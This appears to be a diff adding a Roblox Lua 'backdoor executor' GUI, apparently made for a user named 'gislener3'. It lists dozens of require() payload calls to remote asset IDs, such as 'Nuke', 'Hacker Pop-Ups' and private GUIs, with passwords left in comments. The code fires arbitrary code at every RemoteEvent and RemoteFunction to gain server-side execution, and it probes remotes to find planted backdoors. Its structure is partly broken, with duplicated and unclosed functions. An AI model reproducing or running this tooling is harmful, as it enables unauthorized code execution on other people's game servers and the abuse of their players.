+	["Teleport Tool"] = 'require(15877665199).give("gislener3")',
+	["Nuke"] = 'require(1699614667).Player("gislener3")',
+	["Mystic Tool"] = 'require(11371945115).thisbacon("gislener3")',
+	["Hacker Pop-Ups"] = 'require(10557341183).alert("gislener3", "Hacked")',
+	["Pizza Frenny"] = 'require(103491641253133).piza("gislener3")',
+	["Neko Arc"] = 'require(134825709410639).Burenyuu("gislener3")',
+	["Mario 64 Map"] = 'require(106068294965984).load("gislener3")',
+	["Xpress045 GUI"] = 'require(70482252191449).XP("gislener3")',
+	["Sponger"] = 'require(131352317382292).bob("gislener3")',
+	["Tool Pack"] = 'require(10286545277).RandomStuff("gislener3")',
+	["K00pkidd GUI V2"] = 'require(106877552713430).v2FIXED("gislener3")',
+	["The Future"] = 'require(7089500700).load("gislener3")',
+	["xpl0id GUI"] = 'require(131286909056532).v3("gislener3")',
+	["TOPK3K 5.0"] = 'require(0x342D5F0DA)("gislener3")',
+	["Aureus V1 Cracked"] = 'require(6036737823).CrackedByIncreaseron("gislener3")',
+	["Pootis"] = 'require(80935075895551).load("gislener3",72,73,74)',
+	["Enstrio GUI V7"] = 'require(136356731666684):V7("gislener3")',
+	["Mario Hammer"] = 'require(5321077609).Dark("gislener3")',
+	["Gr33nnb0iis GUI"] = 'require(85677777263783).ssst("gislener3")',
+	["Motorcyle"] = 'require(3990928089).load("gislener3")',
+	["Super Private GUI"] = 'require(0x549efed7c8f2).epic("gislener3")', -- Pass: LinuxDaBuilderEpicPass002
+	["Tymek GUI V1"] = 'require(136385736086501):eza("gislener3")',
+	["Black Death"] = 'require(125607700969890)("gislener3")',
+	["Imatester_77 V4"] = 'require(122492942269889).ops("gislener3")',
+	["Ro-Xploit 6.0 New"] = 'require(104689576394588).load("gislener3")',
+	["TubersGUI V4"] = 'require(0x78091b7cd92c)("gislener3")', -- Pass: or2z9FzpLDdAVX+RaKu22Q==
+	["ItsNotsSkeletons"] = 'require(15441410521).omaygot("gislener3")',
+	["Snake Sniper"] = 'require(81450151375713)("gislener3")',
+	["Cryus"] = 'require(4838321944).cyt("gislener3")',
+	["Siren Head"] = 'require(5239955586).Dark("gislener3")',
+	["Backrooms Map"] = 'require(12313683305).backrooms("gislener3")',
+	["Krystal Dance"] = 'require(130938229717610).kdantlers("gislener3")',
+	["MatGui V8 Edition"] = 'require(77614965585181):v8("gislener3")',
+	["ipadGUI V11"] = 'require(92319006334906).ipadgui("gislener3")',
+	["Noli Forsaken"] = 'require(106974154330330).noli("gislener3")',
+	["Nasar V3"] = 'require(138959012797493).AyumuKasuga("gislener3")',
+	["Parkour Bot"] = 'require(8076509064).CLoad("gislener3")',
+	["1x1x1x1 Forsaken"] = 'require(112223141282221).v1("gislener3")',
+	["Ham00d GUI V1"] = 'require(105834175256340).H4M("gislener3")',
+	["Robot Suit"] = 'require(95235428232107).barrel("gislener3")',
+	["Aureate"] = 'require(5425270046).Dark("gislener3")',
+	["Barbie Car"] = 'require(4745872847).load("gislener3")',
+	["t0cin0 GUI V4"] = 'require(103051230788598).TLoad("gislener3")',
+	["AbdullahRC7 V2"] = 'require(81766565608567):AbdullahRc7("gislener3")',
+	["AbdullahRC7_GUI"] = 'require(136434660525402).AbdullahRC7("gislener3")',
+	["KJ Character"] = 'require(89529616632600)("gislener3", "KJ")',
+	["Grab Knife V1"] = 'require(14638461547).GKV1("gislener3")',
+	["Bomb Vest"] = 'require(18683323231).bombvest("gislener3")',
+	["Rainbow Infinite"] = 'require(4972128286)("gislener3")',
+	["Thomas Train"] = 'require(85704103303160).Thomas("gislener3")',
+	["G00LKidd GUI V5"] = 'require(83534114008594).load("gislener3")',
+	["FE Hax V2.0.2.1"] = 'require(13817392811):loadhax("gislener3")',
+	["xXandresXx GUI"] = 'require(122670740752081):Aload("gislener3")',
+	["Mosque Map"] = 'require(17102919719).map("gislener3")',
+	["Nazi Map"] = 'require(139666139485072).load("gislener3")',
+	["Hyper Car"] = 'require(5874393699).load("gislener3")'
+}
+
+local function CreateScriptButton(name,code,y)
+	local b = Instance.new("TextButton",ScriptScroll)
+	b.Size = UDim2.new(1,-10,0,28)
+	b.Position = UDim2.new(0,5,0,y)
+	b.Text = name
+	b.Font = Enum.Font.Gotham
+	b.TextSize = 12
+	b.BackgroundColor3 = WHITE
+	b.BorderSizePixel = 1
+	b.BorderColor3 = BORDER
+	b.TextColor3 = DARK
+	b.MouseEnter:Connect(function()
+		b.BackgroundColor3 = BLUE
+		b.TextColor3 = WHITE
+	end)
+	b.MouseLeave:Connect(function()
+		b.BackgroundColor3 = WHITE
+		b.TextColor3 = DARK
+	end)
+	b.MouseButton1Click:Connect(function()
+		TextBox.Text = code
+		ConsoleText.Text = "Loaded Script: "..name
+	end)
+end
+
+local y = 5
+for name,code in pairs(Scripts) do
+	CreateScriptButton(name,code,y)
+	y = y + 35
+end
+
+ScriptScroll.CanvasSize = UDim2.new(0,0,0,y)
+
+Execute.MouseButton1Click:Connect(function()
+	ConsoleText.Text = "Script Executado com Sucesso"
+	local CodeStr = TextBox.Text
+	local InvokeFunc = Instance.new("BindableEvent")
+	InvokeFunc.Event:Connect(function(rfunc,codestr2)
+		rfunc:InvokeServer(codestr2)
+	end)
+	local function DeepFire(inst)
+		local function DeepFire(inst)
+		if inst == PlayerGui or inst == game:GetService("Chat") then 
+			return 
+		end
+
+		for _, childy in inst:GetChildren() do
+			if childy.Parent ~= game:GetService('RobloxReplicatedStorage') then
+				if childy:IsA("RemoteEvent") then
+					pcall(function() childy:FireServer(CodeStr) end)
+				elseif childy:IsA("RemoteFunction") then
+					InvokeFunc:Fire(childy, CodeStr)
+				end
+			end
+			
+			pcall(function()
+				DeepFire(childy)
+			end)
+		end 
+	end
+	DeepFire(workspace)
+	DeepFire(game:GetService("ReplicatedFirst"))
+	DeepFire(game:GetService("JointsService"))
+		if not IsAcquiring then 
+		if AcquiredRemote == nil then 
+		for _, childy in inst:GetChildren() do
+			if childy.Parent ~= game:GetService('RobloxReplicatedStorage') then
+				if childy:IsA("RemoteEvent") then
+					print("[RCE] rodando... "..childy.ClassName..' "'..childy.Name..'".')
+					childy:FireServer(CodeStr)
+				elseif childy:IsA("RemoteFunction") then
+					print("[RCE] rodando... "..childy.ClassName..' "'..childy.Name..'".')
+					InvokeFunc:Fire(childy, CodeStr)
+				end
+			end
+			DeepFire(childy)
+		end 
+		else 
+		if AcquiredRemote:IsA("RemoteEvent") then 
+			AcquiredRemote:FireServer(CodeStr) 
+		elseif AcquiredRemote:IsA("RemoteFunction") then 
+			task.spawn(function() AcquiredRemote:InvokeServer(CodeStr) end) 
+		end
+		end 
+		end
+	end
+	warn("[RCE ] Rodando o cÃ³digo com todos os remotes"..CodeStr)
+	DeepFire(game)
+	ConsoleText.Text = "[RCE] executado"
+end)
+
+Clear.MouseButton1Click:Connect(function()
+	TextBox.Text = ""
+	ConsoleText.Text = "Editor Limpo"
+end)
+
+Acquiquirir.MouseButton1Click:Connect(function() 
+	local RemoteList = {} 
+	local CurrentRemote = nil 
+	local isFound = false
+	if not isAcquiring then 
+		isAcquiring = true 
+		warn('[RCE] Analizando os remotes') 
+		TextBox.Text = '[RCE] Aguarde, Analizando todos os remotes...'
+		for i,v in pairs(game:GetDescendants()) do 
+			if v.Parent ~= game:GetService('RobloxReplicatedStorage') then 
+				if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then 
+					debug('Getting '..v.ClassName..' "'..v.Name..'" into RemoteList.')
+					table.insert(RemoteList,v) 
+				end 
+			end
+		end 
+		for a,b in pairs(RemoteList) do
+			if AcquiredRemote == nil then 
+				print("[RCE] Analizando"..b.ClassName..' "'..b.Name..'".') 
+				local NeededNameOfModel = string.char(math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A)) 
+				local NeededCode = 'Instance.new("Model",workspace).Name="'..NeededNameOfModel ..'"'
+				CurrentRemote = b 
+				if b.Parent ~= game:GetService('RobloxReplicatedStorage') then 
+					if b:IsA('RemoteEvent') then 
+						debug('Fired')
+						b:FireServer(NeededCode) 
+					elseif b:IsA('RemoteFunction') then 
+						debug('Invoked')
+						task.spawn(function() b:InvokeServer(NeededCode) end) 
+					end 
+				end 
+				debug('Awaiting')
+				wait(2.5) 
+				if workspace:FindFirstChild(NeededNameOfModel) then 
+					debug('Detected')
+					if workspace:FindFirstChild(NeededNameOfModel):IsA("Model") then 
+						debug('Success')
+						AcquiredRemote = b
+					end 
+				end 
+			end 
+		end 	
+
+local function UpdateStatus(AcquiredRemote)
+	isAcquiring = true
+	
+	if AcquiredRemote ~= nil then
+		isFound = true
+		
+		TextBox.Text = [[
+[RCE] -- Remote adquirido com sucesso! :D
+[RCE] -- Status: OK
+]]
+		
+		warn("Remote adquirido")
+	else
+		isFound = false
+		
+		TextBox.Text = [[
+[RCE] -- Nenhum backdoor encontrado.
+[RCE] -- Status: Seguro
+]]
+		
+		warn("[RCE] Remote nÃ£o encontrado")
+	end
+	
+	isAcquiring = false
+end
+		isAcquiring = false 
+	end 
+	ConsoleText.Text = "[RCE] olhe o console"
+end)
+
+R6.MouseButton1Click:Connect(function()
+TextBox.Text = 'require(3436957371):r6("gislener3")'
+	ConsoleText.Text = "[RCE] R6 ativo"
+end)
+
+RE.MouseButton1Click:Connect(function()
+    local char = player.Character
+    if char then
+        char:BreakJoints() -- Método simples de respawn/kill
+        ConsoleText.Text = "[RCE] Player Resetado"
+    end
+end)
+
+respawn(game:GetService("Players").LocalPlayer)
+
+UpdateEditor()
